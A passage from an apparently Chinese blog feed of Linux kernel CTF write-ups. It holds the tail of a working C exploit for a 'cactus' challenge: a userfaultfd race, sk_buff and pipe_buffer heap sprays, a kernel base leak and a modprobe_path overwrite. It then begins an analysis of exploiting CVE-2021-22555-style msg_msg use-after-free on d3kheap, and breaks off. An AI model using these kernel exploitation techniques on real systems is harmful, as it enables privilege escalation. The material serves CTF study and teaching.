class="line">    <span class="keyword">char</span> *flag[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">int</span> flag_fd;</span><br><span class="line"></span><br><span class="line">    prepare_mod();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM2; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd2[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd2[i][<span class="number">1</span>], <span class="string">&quot;7777pray&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kernelpwn&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] open 0 kernelpwn error!%d\n&quot;</span>, fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    add(buf);</span><br><span class="line">    RegisterUserfault(page, edit_handle);</span><br><span class="line">    <span class="keyword">clock_t</span> <span class="keyword">start_t</span>, <span class="keyword">finish_t</span>;</span><br><span class="line">    <span class="keyword">start_t</span> = clock();</span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&#x27;[-] fork error!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] Child process sleeping now...&quot;</span>);</span><br><span class="line">        del(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] Child process started.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] trapped in userfaultfd&quot;</span>);</span><br><span class="line">        edit(<span class="number">0</span>, <span class="number">0x202</span>, page);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finish_t</span> = clock() - <span class="keyword">start_t</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gap:%d\n&quot;</span>, <span class="keyword">finish_t</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sk_buf, <span class="number">0</span>, <span class="number">704</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], sk_buf, <span class="keyword">sizeof</span>(sk_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] spray sk_buff success&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;196082&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] spray pipe_buffer success&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *)&amp;sk_buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;sk_buf, <span class="keyword">sizeof</span>(sk_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] read success!&quot;</span>);</span><br><span class="line">            <span class="comment">// print_hex(sk_buf, 0x2c0);</span></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got pipe_buf_ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)pipe_buf_ptr-&gt;ops;</span><br><span class="line">                kernel_base = (kernel_addr - <span class="number">0x103ed80</span>);</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_addr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] leak error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%p \033[32m\033[1moffset: \033[0m%p\n&quot;</span>,</span><br><span class="line">           kernel_base, kernel_offset);</span><br><span class="line">    modprobe_path = kernel_offset + <span class="number">0xffffffff82a6c000</span> - <span class="number">0xe0</span>;</span><br><span class="line">    add(buf);</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)buf + <span class="number">0x200</span>) = modprobe_path;</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x300</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write(sk_sockets[<span class="number">0</span>][<span class="number">0</span>], sk_buf, <span class="keyword">sizeof</span>(sk_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(sk_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(sk_buf));</span><br><span class="line">    pointer_buf = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;sk_buf;</span><br><span class="line">    pointer_buf[<span class="number">0</span>] = kernel_offset + <span class="number">0xffffffff82382ba7</span>;</span><br><span class="line">    pointer_buf[<span class="number">1</span>] = kernel_offset + <span class="number">0xffffffff82382bae</span>;</span><br><span class="line">    pointer_buf[<span class="number">2</span>] = kernel_offset + <span class="number">0xffffffff823a20e0</span>;</span><br><span class="line">    pointer_buf[<span class="number">4</span>] = <span class="number">0x000004e200000000</span>;</span><br><span class="line">    pointer_buf[<span class="number">5</span>] = <span class="number">0xa</span>;</span><br><span class="line">    pointer_buf[<span class="number">12</span>] = <span class="number">0x000004e200000000</span>;</span><br><span class="line">    pointer_buf[<span class="number">13</span>] = <span class="number">0xa</span>;</span><br><span class="line">    pointer_buf[<span class="number">20</span>] = <span class="number">0x000004e200000000</span>;</span><br><span class="line">    pointer_buf[<span class="number">21</span>] = <span class="number">0xa</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(sk_buf + <span class="number">0xe0</span>, <span class="string">&quot;/tmp/copy.sh&quot;</span>);</span><br><span class="line">    pointer_buf[<span class="number">61</span>] = kernel_offset + <span class="number">0xffffffff82a6c108</span>;</span><br><span class="line">    pointer_buf[<span class="number">62</span>] = kernel_offset + <span class="number">0xffffffff82a6c108</span>;</span><br><span class="line">    pointer_buf[<span class="number">63</span>] = <span class="number">0x32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write(sk_sockets[<span class="number">0</span>][<span class="number">0</span>], sk_buf, <span class="keyword">sizeof</span>(sk_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] modprobe_path addr=&gt;%p\n&quot;</span>, modprobe_path + <span class="number">0xe0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM2; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd2[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd2[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">    flag_fd = open(<span class="string">&quot;/tmp/myflag&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;FAILED to hijack!&quot;</span>);</span><br><span class="line">    read(flag_fd, flag, <span class="number">0x100</span>);</span><br><span class="line">    write(<span class="number">1</span>, flag, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// del(0);</span></span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220922173328405.png"                      alt="image-20220922173328405"                ></p><h2 id="补充一下"><a href="#补充一下" class="headerlink" title="补充一下"></a>补充一下</h2><p>根据exp可以可能会存在以这样一个疑问：为什么开始要申请16个pipe_buffer结构体？</p><p>上面这个问题我依稀记得我在某篇文章提到过，不过我也没找到，所以这里再做一下解释。在最后利用时我们就已经破坏掉了slab的freelist链表了，但是系统会继续申请很多堆块，所以我们所做的算是保证在申请0x400size的object的时候不会发生kernel panic。</p><hr><p>题目链接：<a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/cactus.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/cactus.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实这道题很简单，但是因为那个d3kheap卡得太久了并且内核版本是5.13所以我默认这道题目的版本也为5.13了，导致我完全没有去想利用userfaultfd，但题目内核实际版本是5.10.102。&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; cl</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="sk_buff" scheme="https://cv196082.gitee.io/tags/sk-buff/"/>
    
    <category term="pipe_buffer" scheme="https://cv196082.gitee.io/tags/pipe-buffer/"/>
    
    <category term="userfaultfd" scheme="https://cv196082.gitee.io/tags/userfaultfd/"/>
    
    <category term="modprobe_path" scheme="https://cv196082.gitee.io/tags/modprobe-path/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-22555利用方法分析</title>
    <link href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/"/>
    <id>https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/</id>
    <published>2022-09-20T14:41:14.000Z</published>
    <updated>2022-11-22T09:04:55.499Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在上一篇文章d3kheap中提到还有另外一种解决办法就是利用这一CVE进行利用，所以这一篇依旧使用d3kheap来进行复现。不过这里首先提一下这个CVE原本的漏洞。</p><p>在原本的CVE中漏洞点是<code>net/netfilter/x_tables.c</code> 中 <code>Netfilter</code> 模块的<code>ip_tables</code>子模块， 当调用<code>setsockopt()</code>和选项<code>IPT_SO_SET_REPLACE</code>（或 <code>IP6T_SO_SET_REPLACE</code>）时，内核结构需要从32位转换为64位，由于错误计算转换大小，导致在调用 xt_compat_match_from_user() 函数时堆溢出写 0。</p><p>这里利用这一漏洞的方法是，首先我们需要在msg_queue中存放两个msg_msg，分为一个主消息(0x1000)和一个辅助消息(0x400)。利用两个字节的溢出覆盖掉其中某一个主消息<code>msg_msg-&gt;m_list-&gt;next</code>指针，使两个msg_msg主消息指向同一个辅助消息，进而转化为UAF漏洞。后续的利用会在d3kheap题目提到这里就不再赘述了。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>因为我们这里相较于原本的CVE中可以更为简单的形成uaf，所以我们只需要考虑如何使用结构体即可。我们顺理成章的选择与原CVE相同的msg_msg建立主从消息队列</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/ViAM3gDxpl1kQj9.png"                                     ></p><p>为了方便后续的利用我们主从消息堆块的size分别选择96和1024。</p><p>此时我们可以利用d3kheap的功能造成UAF，但是我们仍然可以通过其中一个消息队列访问这个已经进入freelist的msg_msg，所以现在我们需要定位这一个msg_queue</p><h3 id="定位msg-queue"><a href="#定位msg-queue" class="headerlink" title="定位msg_queue"></a>定位msg_queue</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/sCflaOFvMSzhGUV.png"                                     ></p><p>这里是目前内存中主从形式，这里我们使用<code>sk_buff</code>堆喷来定位这个free了的msg_msg结构体，该结构体类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针，并且存放用户数据的object只有0x140存放着一些指针，所以在这道题目里我们进行堆喷时write的大小为<code>0x2c0</code>。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/AV8HsnZj2bUCl4J.png"                                     ></p><p>至于这个结构体的分配与释放也是十分简单，sk_buff 在内核网络协议栈中代表一个「包」，我们不难想到的是我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作。</p><p>根据前一篇的思路，我们使用msgrcv时还是会使用MSG_COPY标识位。但是我们到底如何判断呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Found a suitable message.</span></span><br><span class="line"><span class="comment">         * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">      msg = ERR_PTR(-E2BIG);</span><br><span class="line">      <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">         * not update queue parameters.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">      msg = copy_msg(msg, copy);</span><br><span class="line">      <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    list_del(&amp;msg-&gt;m_list);</span><br><span class="line">    msq-&gt;q_qnum--;</span><br><span class="line">    msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">    ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">    msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">    atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">    atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">    ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">  ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">  wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">free_copy(copy);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里如果我们传入的bufsz小于<code>msg-&gt;m_ts</code>就会给msg赋值一个负值，然后在后面return出来。不过这里在使用msgrcv函数时需要注意的还有msgtyp这个参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">find_msg</span><span class="params">(struct msg_queue *msq, <span class="keyword">long</span> *msgtyp, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">found</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">long</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">list_for_each_entry(msg, &amp;msq-&gt;q_messages, m_list) &#123;</span><br><span class="line"><span class="keyword">if</span> (testmsg(msg, *msgtyp, mode) &amp;&amp;</span><br><span class="line">    !security_msg_queue_msgrcv(&amp;msq-&gt;q_perm, msg, current,</span><br><span class="line">       *msgtyp, mode)) &#123;</span><br><span class="line"><span class="keyword">if</span> (mode == SEARCH_LESSEQUAL &amp;&amp; msg-&gt;m_type != <span class="number">1</span>) &#123;</span><br><span class="line">*msgtyp = msg-&gt;m_type - <span class="number">1</span>;</span><br><span class="line">found = msg;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == SEARCH_NUMBER) &#123;</span><br><span class="line"><span class="keyword">if</span> (*msgtyp == count)</span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> found ?: ERR_PTR(-EAGAIN);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过阅读其他源码可以看到mode是等于SEARCH_NUMBER的，所以这里会判断msgtyp和count的值，如果我们仍然想上一篇文章那样传入0，就只会读取msg_queue中的第一个msg_msg也就是我们的主消息，不过我们真正需要的辅助消息，所以这里我们还需要把传入的msgtyp修改为1才能获取到我们的目标object。</p><p>所以我们可以控制<code>msg-&gt;m_ts</code>然后控制传入的msgtyp以及bufsz就可以出现报错，不过这里仍然不会出现kernel panic，所以我们可以此种办法定位哪一个meg_queue中的辅助消息为我们的UAF的msg_msg。</p><h3 id="泄漏堆地址"><a href="#泄漏堆地址" class="headerlink" title="泄漏堆地址"></a>泄漏堆地址</h3><p>这里泄漏堆地址的方式其实跟上一篇文章一致的，首先通过越界读取相邻辅助消息堆块的指针，并且此时的辅助消息<code>msg_msg-&gt;m_list.next</code>指向的是msg_queue而<code>msg_msg-&gt;m_list.prev</code>指向的是主消息的地址。一样的主消息<code>msg-&gt;m_list.next</code>指向的是辅助堆块，那么对我们来说就可以通过两次读取泄漏出我们UAF堆块的地址。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/wjzFeZiDUpxXVKJ.png"                                     ></p><p>不过这里的前提是和上一篇文章一样那就是存在相邻的辅助堆块也就是堆块分配在同一页内存上。</p><h3 id="泄漏基地址"><a href="#泄漏基地址" class="headerlink" title="泄漏基地址"></a>泄漏基地址</h3><p>这里泄漏基地址的方法和前面的方法就完全不一样了，这里使用pipe_buffer来泄漏。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址。</p><p>这里使用的方法是，使sk_buff指向这个UAF的堆块，并且他已经是free的状态，接着堆喷pipe_buffer，最后读出数据继续维持UAF状态。</p><h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><p>在上一步我们已经泄漏出基地址，并且此时pipe_buffer所指向的堆块还是free状态，所以我们可以继续利用sk_buff进行堆喷。最后修改ops指针指向我们上面泄漏出来的堆地址，最后跟上一篇文章一样进行ROP即可。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span 